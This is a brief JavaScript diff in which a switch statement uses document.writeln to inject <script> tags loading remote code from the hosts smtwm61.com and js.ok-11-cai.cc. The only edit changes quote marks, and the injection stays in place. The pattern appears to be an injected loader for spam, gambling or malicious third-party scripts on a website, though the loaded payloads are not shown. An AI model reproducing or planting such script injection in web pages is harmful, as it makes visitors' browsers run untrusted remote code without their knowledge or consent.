@@ -9,6 +9,6 @@ switch (n) {
 		document.writeln("<script src=\'https://smtwm61.com/yd.php?id=440\'></script>");
 		break;
 	case 2:
-		document.writeln("<script src=\"https://js.ok-11-cai.cc/slot?7255774253627174051-10479\"></script>");
+		document.writeln("<script src=\'https://js.ok-11-cai.cc/slot?7255774253627174051-10479\'></script>");
 		break;
 }
